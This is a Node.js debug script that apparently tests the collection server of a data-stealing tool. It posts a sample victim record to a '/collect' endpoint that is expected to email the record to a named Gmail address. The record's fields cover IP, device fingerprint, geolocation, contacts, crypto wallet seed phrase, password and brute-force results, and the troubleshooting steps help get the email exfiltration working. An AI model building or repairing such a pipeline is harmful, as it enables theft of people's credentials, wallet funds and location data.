const axios = require("axios");

// Test data
const testData = {
  timestamp: new Date().toISOString(),
  ip: "192.168.1.100",
  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  platform: "Windows",
  device: "16GB RAM",
  language: "en-US",
  screen: "1920x1080",
  cookies: "enabled",
  latitude: "40.7128",
  longitude: "-74.0060",
  accuracy: "10m",
  geoError: "None",
  localStorage: "enabled",
  contacts: ["contact1@test.com", "contact2@test.com"],
  walletName: "Test Crypto Wallet",
  seedPhrase: "test seed phrase for testing purposes",
  password: "testPassword123",
  bruteForceResults: {
    attempts: 5,
    success: false,
    timeSpent: "2.5 seconds",
  },
};

async function debugTest() {
  try {
    console.log("🔍 Debug Test Starting...");
    console.log("📤 Sending test data to server...");
    console.log("📧 Expected email recipient: 411plus411@gmail.com");

    const response = await axios.post(
      "http://localhost:3000/collect",
      testData,
      {
        headers: {
          "Content-Type": "application/json",
        },
        timeout: 10000, // 10 second timeout
      }
    );

    console.log("✅ Server response:", response.data);
    console.log("📧 Email should have been sent!");
    console.log("");
    console.log("🔍 Troubleshooting steps:");
    console.log("1. Check your email at 411plus411@gmail.com");
    console.log("2. Check spam/junk folder");
    console.log("3. Check server console for email errors");
    console.log("4. Verify Gmail app password is correct");
  } catch (error) {
    console.error("❌ Error:", error.message);
    if (error.response) {
      console.error("Server response:", error.response.data);
    }
    if (error.code === "ECONNREFUSED") {
      console.error("Server is not running. Start it with: npm start");
    }
  }
}

debugTest();
